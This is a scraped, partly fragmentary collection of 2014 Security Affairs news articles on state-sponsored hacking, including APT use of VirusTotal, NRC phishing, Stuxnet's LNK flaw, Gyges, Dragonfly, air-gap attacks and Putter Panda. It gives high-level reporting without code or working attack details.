Authors of malware are using VirusTotal to improve evasion techniques before spread the code in the wild.\n\nBrandon Dixon has discovered that many categories of bad actors are using the service, including high-profile APT, to make their code transparent to security solutions and using the VirusTotal service like a sort debugging environment.\n\n\n\nOne of the most prolific groups monitored by Dixon belongs to the popular collective Comment Crew team, revealed by Mandiant for the first time in his report on APT1 collective and its link with Chinese PLA.\n\n\u201cThere\u2019s certainly irony\u201d  \u201cI wouldn\u2019t have expected a nation state to use a public system to do their testing.\u201d Dixon said.\n\nDixon tracked submissions to VirusTotal for years identifying many hacking teams and distinct bad actors, including at least two entities linked to state-sponsored teams. In some cases, the expert noticed that bad actors have submitted again an old malware to evaluate its detection rate.\n\nDixon has designed an algorithm to analyze metadata associated with the submissions to VirusTotal service, the data collected allowed the researcher to spot patterns and clusters of files submitted by two well-known APT  believed to be based in China and in Iran.\n\n\u201cOver weeks and months, Dixon watched as the attackers tweaked and developed their code and the number of scanners detecting it dropped. He could even in some cases predict when they might launch their attack and identify when some of the victims were hit\u2014code that he saw submitted by some of the attackers for testing later showed up at VirusTotal again when a victim spotted it on a machine and submitted it for detection. \u201d reports a blog post published by Wired.\n\nAnother popular threat actor monitored by the research is the group known as NetTraveler which was responsible of numerous cyber espionage campaigns on a large scale. NetTraveler was spotted by KasperskyLab team targeting over 350 high profile victims from 40 countries, the experts believe the team is operating from China and hacked government entities, diplomatic and military organizations for a decade.\n\nThe analysis conducted by Dixon on has an immense value, from the observation of VirusTotal submission over the time it is possible to understand how hackers work, which improvement they have made for their code and which is their cyber capabilities. These information allows analysts to track a profile of the threat actors which could help to solve problem of attribution in case of attack, improve the detection capabilities and prediction of further offensives.\n\n\u201cThe data provides a rare and fascinating look at the inner workings of the hacker teams and the learning curve they followed as they perfected their attacks.

The malicious emails baited the U.S. Nuclear Regulatory Commission by requesting them to verify their user accounts by clicking a link and logging in, the link really took the victims to a Google Docs spreadsheet.\n\nThe report accessed by Nextgov reveals that the IG Cyber Crime Unit was able to \u201ctrack the person who set up the spreadsheet to a foreign country,\u201d without providing further info on its country.\n\n\u201cBased on the mere fact of clicking on the link, NRC cleaned their systems and changed their user profiles,\u201d said commission spokesman David McIntyre highlighting that it is unknown what the NRC employees actually put on the spreadsheet.\n\nIn a second attack, state sponsored hackers served a malware in a spear phishing attack, this time the malicious link embedded in the emails linked back to a Microsoft OneDrive storage folder that hosted a malware.\n\n\u201chackers also attacked commission employees with targeted spearphishing emails that linked to malicious software.

The malware was injected through a PDF attachment that contained a JavaScript exploits.\n\nDifferently from previous attacks, in this third case it was impossible to track the attackers because the ISP\u2019s logs had been destroyed.\n\nUnfortunately, it\u2019s not the first time that state-sponsored hackers target the Nuclear Regulatory Commission, in the past Sen. Tom Coburn, M.D. (R-Okla.) reported that the NRC has stored sensitive details about nuclear plants without implementing proper defensive measures.\n\nCurious that a report on cyber security on the  Nuclear Regulatory Commission issued by the OIG considered the agency suitable for securing nuclear power plants in the case of a major cyberattack avoiding to make any recommendations to the agency.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Nuclear Regulatory Commission, state-sponsored hackers)  \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nuclear-regulatory-commission", "topic_name": "Nuclear Regulatory Commission"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "Kaspersky revealed that Stuxnet Exploits is still used worldwide", "news_link": "https://securityaffairs.co/wordpress/27633/cyber-crime/stuxnet-flaw-still-targeted.html", "title": "Kaspersky revealed that Stuxnet Exploits is still used worldwide\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 19, 2014", "body": "Stuxnet has changed the history of malware development, it is considered the fist cyber weapon used by a government in an act of Information Warfare.

Stuxnet isn\u2019t an exception, one of the main vulnerabilities exploited by the malicious code (CVE-2010-2568), and patched four years ago, is still being used in cyber attacks targeting millions of computers worldwide.\n\nMicrosoft issued a security patch on August 2nd, 2010, meanwhile Stuxnet was first discovered in June 2010.\n\nThe Windows Shell vulnerability allows a remote or local attacker run code via a malicious .LNK or .PIF file via an improperly handled icon displayed in Windows Explorer.\n\nExperts at Kaspersky Lab discovered that in the period between November 2013 and June 2014, the Windows Shell vulnerability (CVE-2010-2568) exploited by Stuxnet was detected 50 million times targeting nearly 19 million machines all over the world.

Most of the 2,800 companies identified as victims of the attack are in the industrial/machinery market and researchers say the most-targeted countries are the United States, Spain, Japan and Germany.

The level of complexity of Gyges is very high, the experts have found similarities with malware used by the Russian Government as cyber weapon, but the concerning aspect of the story is that the malware is targeting commercial sector.\n\nIt is not clear how the experts have associated Gyges code to state-sponsored operation, the report doesn\u2019t provide too much details on this aspect, it just highlights that the code was detected in previous targeted attacks, the experts also confirmed that there is no commercial malware with such level of complexity. .\n\nAs explained by the experts in an official report issued by Sentinel Labs Gyges seems to be the result of the \u201ccontamination\u201d of a very complex code used to avoid detection and the more quick and dirty executable that directs the payload.\n\nThe most complex part of Gyges is represented by the evasion techniques, the malware is able to avoid controlled execution of the malicious code in a sandbox or in a virtual environment, a technique used by the security analysts to qualify the cyber threat. The author of the malware also designed a set of features to make harder the reverse engineer or debug of the malicious code.\n\n\u201cThis specific Gyges variant was detected by our on-device heuristic agents and caught our attention due to its sophisticated anti-tampering and anti-detection techniques. It uses less well-known injection techniques and waits for user inactivity, (as opposed to the more common technique of waiting for user activity). This method is clearly designed to bypass sandbox-based security products which emulate user activity to trigger malware execution.\u201d Gyges uses a hooking bypass technique that exploits a logic bug in Windows 7 and Windows 8  (x86 and x64 versions) \u201cstates the report.\n\nAs explained in the report, Gyges also includes sophisticated components for data exfiltration, keylogging and eavesdropping of targeted networks. The dirty components added to the code by criminal gangs behind the malware campaign includes ransomware capabilities and a banking data stealer, revealing the financial motivations of the bad actors.\n\nThe circumstance that source code developed by a government is in the hands of cyber criminals is worrying and in line with predictions of security experts. F-Secure\u2019s Chief Mikko Hypp\u00f6nen at the TrustyCon explained the risk that a Government-built malware and cyber weapons will run out of control.\n\n\u201cGovernments writing viruses: today we sort of take that for granted but 10 years ago that would have been science fiction,\u201d \u201cIf someone had come to me ten years ago and told me that by 2014 it will be commonplace for democratic Western governments to write viruses and actively deploy them against other governments, even friendly governments, I would have thought it was a movie plot. But that\u2019s exactly where we are today.\u201d he said during his speech. \n\nThe uncontrolled diffusion could happen in various ways, a data breach or the outsourcing of part of the development of the malicious code to malware authors.\n\n\u201cIt comes as no surprise to us that this type of intelligence agency-grade malware would eventually fall into cybercriminals\u2019 hands,\u201d \u201cGyges is an early example of how advanced techniques and code developed by governments for espionage are effectively being repurposed, modularized and coupled with other malware to commit cybercrime.\u201d wrote Sentinel Labs research head, Udi Shamir.\n\nDespite Russia is considered one of the most advanced cyber-powers, it\u2019s hard to link a component of a malicious code discovered in the wild to its cyber units, today there is little knowledge of Russian cyber arsenal and its real capabilities that evolve rapidly. Recently BAE Systems Applied Intelligence disclosed a Russian cyber espionage campaign codenamed as SNAKE that targeted Governments and Military Networks.\n\nThe attackers behind the operation SNAKE penetrated highly secured systems all around the world, but most interesting revelation is that the Uroburos rootkit recently discovered by German security firm G Data Software was just one component of the overall SNAKE campaign.\n\nAnother interesting discovery was made early this month by experts at F-Secure firm which detected another strain of malware called Cosmu, which they suggested could be a Russian cyber weapon.\n\n\u201cThe Gyges variant not only demonstrates the growing sophistication of malware, but more importantly shows how the lines are blurring between government-grade and mainstream attack code. The fact that \u201ccarrier\u201d code can be \u201cbolted on\u201d to any type of malware to carry out invisible attacks is another indication that current approaches to security have reached their end-of-life for detecting advanced threats.\u201d concludes the report.\n\nThe mixing of commercial malware with high sophisticated components derived by cyber weapons could generate new powerful cyber threats hard to detect and dangerous for every entities in the cyber space.\n\nPierluigi Paganini\n\nSecurity Affairs \u2013  (Gyges , malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cosmu", "topic_name": "Cosmu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gyges", "topic_name": "Gyges"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ransomware", "topic_name": "ransomware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/snake", "topic_name": "SNAKE"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uroburos", "topic_name": "Uroburos"}]}, {"news_name": "Chinese hackers violated systems at the Office of Personnel Management", "news_link": "https://securityaffairs.co/wordpress/26525/hacking/chinese-hackers-hacked-us-systems.html", "title": "Chinese hackers violated systems at the Office of Personnel Management\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 11, 2014", "body": "According to the New York Times, senior American officials revealed that a group of Chinese hackers violated the computer networks of the United States government agency in March.

They appeared to be targeting the files on tens of thousands of employees who have applied for top-secret security clearances.\u201d states the NYT.\n\nAccording to the revelations of a Government spokesperson the attack was detected by a monitoring system which \u201calerted to a potential intrusion of our network in mid-March.\u201d\n\n\n\nAlleged Chinese hackers gained access to some of the databases managed by the Office of Personnel Management. The official confirmed that the incident has been assigned to an emergency response team \u201cto assess and mitigate any risks identified.\u201d\n\nAccording to the NYT the cyber attack is very disturbing due the target chosen by hackers, the media agency refers a system called e-QIP  used to archive personal information, including financial data, on federal employees having security clearances.\n\n\u201cFederal employees who have had security clearances for some time are often required to update their personal information through the website. The agencies and the contractors use the information from e-QIP to investigate the employees and ultimately determine whether they should be granted security clearances, or have them updated.\u201dstates the NYT.\n\nThis is just one of the numerous cyber attacks observed on both sides, Chinese and US governments have significant cyber capabilities and both repeatedly exchanged accusations for cyber espionage activities.\n\nRecently the US government charged five Chinese citizens of state-sponsored hacking on US government network for cyber espionage.\n\nLast week, researchers at CrowdStrike revealed that the hacking team dubbed Deep Panda is targeting US think thank firms with a significant knowledge on the Iraqi situation, the circumstance confirms the high propensity of Chinese authorities in cyber espionage as Intelligence practices.\n\nThe cyber incursions are not limited to Intelligence and the military, practically every industry is daily targeted by Chinese hackers, according reports produced by principal security firms like Mandiant-Fire Eye and CrowdStrike.\n\nThe NYT remarked that it is crucial information sharing on threats and incidents observing that despite US officials have encouraged businesses to share data related to data breaches with each other and the government offices, in this specific case US military omitted to disclose the information on the cyber attack.\n\n\u201cThe administration has never advocated that all intrusions be made public. We have advocated that businesses that have suffered an intrusion notify customers if the intruder had access to consumers\u2019 personal information. We have also advocated that companies and agencies voluntarily share information about intrusions.\u201d is the reply provided by Caitlin Hayden, an Obama administration spokeswoman.\n\nPierluigi Paganini\n\nSecurity Affairs \u2013  (Chinese hackers, US)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/chinese-hackers", "topic_name": "Chinese hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/crowdstrike", "topic_name": "CrowdStrike"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-panda", "topic_name": "Deep Panda"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mandiant-fire-eye", "topic_name": "Mandiant-Fire Eye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pla", "topic_name": "PLA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/unit-61398", "topic_name": "Unit 61398"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Pentagon confirms that missile defenses are vulnerable to cyber attack", "news_link": "https://securityaffairs.co/wordpress/26446/cyber-warfare-2/pentagon-confirms-missile-defenses-vulnerable-cyber-attack.html", "title": "Pentagon confirms that missile defenses are vulnerable to cyber attack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 8, 2014", "body": "The Director of the Pentagon\u2019s Missile Defense Agency reported to the Congress last week that missile defenses deployed by the US Army are vulnerable to cyber attacks. Security experts are aware that every system could be affected by several flaws exploitable in a cyber attack, but we are led to believe that the defense systems in the military are more reliable and robust for obvious reasons.\n\nThe Director has confirmed that a cyber attack could disrupt the sophisticated networks of sensors and guidance systems use in missile defenses to target enemy missiles. The first question that everyone has in mind is \u201cHow is it possible?\u201d, in military industry the security by design is one of the fundamentals and it is very difficult for common people to imagine a so disconcerting scenario.\n\n\n\nDuring a Senate defense appropriations subcommittee hearing June 11, Sen. Jack Reed, (D-RI) asked MDA Director Vice Adm. James Syring how vulnerable are the communications links between radar, satellites and other sensors to cyber attacks.\n\n\u201cHow vulnerable are those external sources to cyber attack so that someone contemplating a launch would first conduct a cyber-interruption of your guidance systems?\u201d Reed asked.\n\n\u201cSir, we\u2019ve looked at that.

Gen. David Mann, commander of the Army Space and Missile Defense Command, confirmed the possibility of a cyber attack:\n\n\u201cwha\u201ct we\u2019re looking at internally is in terms of cyber and what can we do to make sure that we, first, identify vulnerabilities, but also put in place our ability to put up that shield, that wall\u201d against cyber attacks.\u201d Mann said.\n\nCountries like Russia and China are considered the principal threats for US industries, including Defense. In February US Intelligence officials announced that foreign spying are the No. 2 danger facing the country, cyber espionage conducted by State-sponsored hacking could give to the attacker a strategic advantage also in the hacking of military systems like missile defenses.\n\nMann also explained that  US Defense is aware that foreign governments are conducting many campaign to find a hole within the security of strategic offensive ballistic missiles.\n\n\u201cWe\u2019re looking at that very, very hard, a lot of red-teaming going on,\u201d \u201cAnd I think you know that there\u2019s a lot of countries out there that are continuously, on a daily basis, trying to access different networks.\u201d Mann added.\n\nTo respond cyber threats that are even more sophisticated the US Defense must continuously audit its infrastructures and system to find potential flaw and harden the environment.\n\nMann added that \u201cwe\u2019re continuously looking at our different architectures and what needs to be done to harden them against cyber, because I think that\u2019s \u2014 quite frankly, that\u2019s the biggest threat that we have right now to our systems, is the impact of cyber.\u201d\n\nThe menace to defense networks is not a new issue, the economic crisis and cuts to the budget for the Defense led experts fearing the Department of Defense\u2019s computer networks may be more exposed to the risk of a major cyber attack.\n\nIn 2008, attackers successfully breached the U.S. Central Command in Afghanistan with an infected flash drive as an attack vector, in that circumstance The Pentagon has not disclosed information on the nature and the volume of the stolen data.\n\nIn 2011, \u201cIn a single intrusion this March, 24,000 files were taken,\u201d former Deputy Defense Secretary William J.

Unfortunately the effects of these cyber attacks could be serious and could also menace the population of a country, Stuxnet case demonstrated the fragility of a critical infrastructure and the efficiency of a cyber weapon.\n\nOne of the most intensive cyber dispute is the one that is fought by North Korea and South Korea, two countries with very good cyber capabilities, that in many cases have tried to hit their enemies from the cyberspace.\n\nThe tension between North Korea and South Korea is very high, both governments are spending a great effort to improve their cyber capabilities and to assert their supremacy over their rivals.\n\nEarly this year the Yonhap news agency reported that the Government of Seoul was working for the development of a cyber weapon to hit North Korean nuclear facilities. The decision to hit North Korean nuclear facilities is motivated by the intensification of  the testing of nuclear weapons conducted in underground with controlled explosions by the Government of Pyongyang.\n\n\u201cOnce the second phase plan is established, the cyber command will carry out comprehensive cyber warfare missions,\u201d said a senior ministry official referring the possibility to target North Korean nuclear plants.\n\nNorth Korea has the highest percentage of military personnel in relation to population, it has approximately 40 enlisted soldiers per 1000 people with a considerable impact on the budget of the country. Last year a defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\n\n\nBut new revelations on the cyber capabilities of North Korea are worrying Seoul, the government of Pyongyang has doubled the number of the units of its cyber army. According to a report issued by the news agency, the number of cyber warriors of the The North Korea now is 5,900 and the cyber army has also established overseas bases for hacking attacks.\n\n\u201cThe communist country operates a hacking unit under its General Bureau of Reconnaissance, which is home to some 1,200 professional hackers,\u201d a military source was quoted as saying.\n\nThe South\u2019s Yonhap news agency revealed that North Korean cyber units were involved in a series of cyber attacks launched through overseas bases in countries such as China. The North Korean cyber army hit many times the infrastructure of the South Korea, banks, military entities, media and TV broadcasters were hit with malware and other sophisticated techniques.\n\nIn July Mc Afee Lab experts revealed that hackers behind the recent attacks against South Korean infrastructure are professionals that designed also malicious code to steal military secrets to the South Korea and US military. Security experts at McAfee Labs revealed that the malware used during the attacks was expressly designed to find and steal secret information on US forces involved in joint exercises in South Korea.\n\nResearchers dubbed the campaign Operation Troy due the numerous references into the source code of the city, the malicious code used appears the same implanted into a social media website used by military personnel in South Korea in 2009.\n\nRyan Sherstobitoff, a senior threat researcher at McAfee, provided to the The Associated Press a report that will be publicly issued later this week on the analysis of malware instances detected. Despite it is not clear the exact amount of information stolen, neither the exact networks penetrated by attackers, South Korean Government blamed North Korean state sponsored-hackers.\n\nResearchers highlighted that there are various clues in the malicious code which lead to the North Korea, for example the password used to unlock encrypted files contains the number 38 probably linked to \u201c38th parallel\u201d that separates the North from South Korea.\n\nSherstobitoff started the investigation after the malware based attacks occurred on March 20th, known as the Dark Seoul Incident, in which tens of thousands of hard drives belonging to television networks and banks in South Korea were wiped.\n\n\u201cThis goes deeper than anyone had understood to date, and it\u2019s not just attacks: It\u2019s military espionage,\u201d Sherstobitoff said\n\nAs usual, the North has denied any involvement and accuses South Korea of fabricating the incidents to increase the tension between the states.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  cyber warfare, Korea)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-army", "topic_name": "cyber army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/general-bureau-of-reconnaissance", "topic_name": "General Bureau of Reconnaissance"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/no-91-office", "topic_name": "No. 91 Office"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-troy", "topic_name": "Operation Troy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/south-korea", "topic_name": "South Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Dragonfly gang is targeting Western energy industry", "news_link": "https://securityaffairs.co/wordpress/26273/cyber-crime/dragonfly-gang-energy-industry.html", "title": "Dragonfly gang is targeting Western energy industry\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 2, 2014", "body": "The energy industry is under attack, more than one thousand companies in Europe and North America are constantly under attack.\n\nICS/SCADA systems are privileged targets of state-sponsored hackers and cyber criminals, last week I wrote of the discovery made by security experts from F-Secure which detected a variant of Havex targeting critical infrastructure.\n\nThe attackers conducted watering-hole attacks compromising ICS vendor website, the SCADA vendors targeted by the Havex campaign are based in Germany, Switzerland and Belgium, two of them are suppliers of remote management software for ICS systems and the third one develops high-precision industrial cameras and related software.\n\nSecurity experts at Symantec discovered a new campaign targeting organization located in the US, Italy, France, Spain, Germany, Turkey, and Poland, the researcher dubbed the bad actors behind the attacks the \u201cDragonfly\u201d gang.\n\n\n\nThe Dragonfly group, also known by other vendors as Energetic Bear, seems to be operating since at least 2011 when it targeted defense and aviation companies in the US and Canada.  Only in a second phase Dragonfly has focused its effort on US and European energy firms in early 2013.\n\nSymantec has immediately informed the victims and national authorities, including Computer Emergency Response Centers (CERTs).\n\n\u201cThe attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to energy supplies in affected countries.\u201d states a blog post from Symantec.\n\nDragonfly gang hit energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers with cyber espionage campaign.\n\nThe gang could count on different attack vectors, including watering hole attacks, spear-phishing emails and trojanized ICS software updates like the case of Havex RAT.\n\nAccording to Symantec, the Dragonfly gang is well resourced, it can count on numerous malicious tools to conduct its campaign, the two main malware tools used by attackers are the Backdoor.Oldrea and the Trojan.Karagany. \n\n\u201cIts most ambitious attack campaign saw it compromise a number of industrial control system (ICS) equipment providers, infecting their software with a remote access-type Trojan. This caused companies to install the malware when downloading software updates for computers running ICS equipment. These infections not only gave the attackers a beachhead in the targeted organizations\u2019 networks, but also gave them the means to mount sabotage operations against infected ICS computers.\u201d states Symantec.\n\nDifferently from the popular Stuxnet virus which was primarily designed for sabotage purpose, the malware used by Dragonfly gangs were designed to allow espionage and persistent access to the targeted systems.\n\nAlso in this case the attackers are mainly interested to data exfiltration from targeted industrial systems, the motivation for such attacks is still unclear, but the Symantec team suspects that behind Dragonfly there are state sponsored hackers.\n\nI fear that these cases represent only the tip of the iceberg, many attacks to date have not yet been identified, while the number of attacks is likely to increase.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  SCADA,  Dragonfly)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dragonfly", "topic_name": "Dragonfly"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/energetic-bear", "topic_name": "Energetic Bear"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/energy", "topic_name": "energy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/havex", "topic_name": "Havex"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/isc", "topic_name": "ISC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}]}, {"news_name": "Air-gap network hacking technique, infects systems via cellphone even if isolated from the Internet", "news_link": "https://securityaffairs.co/wordpress/25782/hacking/air-gap-network-hacking.html", "title": "Air-gap network hacking technique, infects systems via cellphone even if isolated from the Internet\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 15, 2014", "body": "Researchers at Ben Gurion University presented a study on the hacking technique dubbed air-gap network hacking which allows an attacker to inoculate a specific type of malware into a cellphone and use the mobile device as an attack vector to hit computer in the vicinity. The news was spread by the Time of Israel website, the attack scenario proposed is disconcerting, a hackers from any place on the planet could use cellphone-based malware to remotely access any data stored in a targeted system, this is possible exploiting the electromagnetic waves emanating from computers even is it is isolated from the Internet.\n\nThis attack scenario to air-gap networks has been debated many times as explained the Prof. Yuval Elovici, head of BGU\u2019s Cyber Security Lab, the element of innovation in the air-gap network hacking is the use of cellphone.\n\nAlso the computer systems within the Iranian plant of Nataz infected by Stuxnet were isolated from the internet, in that case source of intelligence referred the use of USB as an attack vector. Let\u2019s try to image an attack to a critical infrastructure based on the air-gap network hacking technique, it\u2019s clear that it could have devastating effects.\n\nThe attack described by Elovici is based on the use of electromagnetic or acoustic emanations from targeted hardware.\n\n\n\nUS intelligence has already explored this attack technique, the NSA program known as TEMPEST makes use of special devices to syphon data from computers and servers via leaking emanations, including unintentional radio or electrical signals and vibrations from targeted hardware (e.g. Monitors, memory chips, keyboards, network cards and connection cables).\n\nIn my article published on the Infosec Institute, titled  How the NSA Monitors Target Computers with Radar Wave Devices, it is referred the presentation made by the popular cryptographer and activist Jacob Appelbaum at the 30th Chaos Communication Congress on the militarization of the internet. Appelbaum took to Der Speigel the pages of a catalog of backdoors, monitoring programs and many other spying tool-kits used by the NSA.\n\nThe document refers a set of components designed by the NSA to spy on computer screens, fax/printers, audio devices and keyboards, by not even having to install an agent on the target machine, the systems are based on continuous wave irradiation. The tools belong to the ANGRYNEIGHBOR family of bugs. The series of bugs implemented as RF retro reflectors communicate with the use of an external radar wave generator such as CTX4000 or PHOTOANGLO. Appelbaum at the Chaos Communication Congress confirmed the existence of the device (CTX4000 or PHOTOANGLO), described as a portable continuous wave generator. He added that it\u2019s remote controllable and works in combination with tiny electronic implants to bounce waves of energy off monitors, keyboards and printers to analyze what has been respectively viewed, typed and printed.\n\nThe ANGRYNEIGHBOR family of bugs is considerably revolutionary, because it works even if the target device isn\u2019t online, enlarging the possibility of an attack for NSA agents.\n\nHow could a mobile phone be used to hack into an air-gapped network? How does work the air-gap network hacking technique?\n\nThe attacker has to send a text message that looks legitimate and harmless to the mobile device of an unsuspecting employee in a sensitive installation, in reality the message hides a link to a malware specifically developed to implement the air-gap network technique. In this way the malware is installed on a targeted cellphone.\n\nOnce the malicious code is installed in the phone, it scans for electromagnetic waves which can be manipulated to build a network connection using FM frequencies to install a virus onto a computer or server.\n\n\u201cElovici\u2019s team has demonstrated how this is done with computer video cards and monitors. With the virus installed on the system, the phone connects to it via the FM frequency, sucks information out of the server and uses the phone\u2019s cellphone network connection to transmit the data back to hackers. All that\u2019s needed is physical proximity to the system. The team said that one to six meters is enough.\u201d reports the Times of Israel.\n\nElovici and his team of researchers have presented the air-gap network technique to the President Shimon Peres during his visit to BGU\u2019s Cyber Lab last month.\n\nElovici confirmed that is impossible to prevent this kind of cyber-attack is a cellphone is turned on in the vicinity of a target, his team is searching for a defensive solution to this type of attacks.\n\n\u201cIt\u2019s a major security risk, he said. Until a solution is found, that risk will only increase, as news of the hack spreads in the hacker community.\u201d reported the post on the consideration made by Elovici.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  air-gap network hacking technique,  hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/air-gap-network", "topic_name": "air-gap network"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/air-gap-network-hacking-technique", "topic_name": "air-gap network hacking technique"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/angryneighbor", "topic_name": "ANGRYNEIGHBOR"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nsa", "topic_name": "NSA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tempest", "topic_name": "Tempest"}]}, {"news_name": "Putter Panda APT behind for cyber espionage campaigns, are they members of PLA Unit 61486?", "news_link": "https://securityaffairs.co/wordpress/25647/hacking/putter-panda-cyberespionage.html", "title": "Putter Panda APT behind for cyber espionage campaigns, are they members of PLA Unit 61486?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 11, 2014", "body": "Putter Panda is the name of bad actor responsible for a series of cyber espionage operations originating in Shanghai, security experts linked its operation to the activity of the People\u2019s Liberation Army 3rd General Staff Department 12th Bureau Unit 61486.\n\nA fake yoga brochure was one of different emails used for a spear phishing campaign conducted by the stealth Chinese cyber unit according an investigation conducted by researchers at the CrowdStrike security firm. Also in this case the experts believe that we are facing with a large scale cyber espionage campaign targeting government entities, contractors and research companies in Europe,  USA and Japan.\n\nThe group has been operating since at least 2007 and appears very interested in research companies in the space and satellite industry, experts at CrowdStrike have collected evidence of a numerous attacks against these industries.\n\nCrowdStrike published a new report which blames China for the different  campaigns conducted to steal trade and military secrets and intellectual property from foreign companies.\n\nThe hacking teams uncovered by CrowdStrike\u2019s forensic experts adopted an efficient strategy to hide their origins by using compromised foreign websites to launch their cyber offensives.\n\nThe security experts noticed that tools using in various cyber espionage campaigns were developed during working hours in Chinese time zones as explained in the report:\n\n\u201ca build time analysis of all known samples is shown in Figure 1 below, relative to China time. Although this shows that there is some bias in the build time distribution to daylight or working hours in China, which is more significant if a possible three-shift system of hours is considered (0900-1200, 1400-1700, and 2000-2300), this evidence is not conclusive. there is also some evidence that build times are manipulated by the adversary; for example, the sample with Md5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013, but was supposedly first submitted to Virustotal on 9 January 2013. this shows that the attackers \u2013 at least in 2013 \u2013 were aware of some operational security considerations and were likely taking deliberate steps to hide their origins. \u201c\n\n\n\nThe reports attributes to the Putter Panda team cyber attacks against dozens of public and private sector organizations to a group of Chinese state-sponsored hackers, called Putter Panda because they often targeted golf-playing conference attendees.\n\nThe hackers focus their exploits against popular applications, including Adobe reader and Microsoft 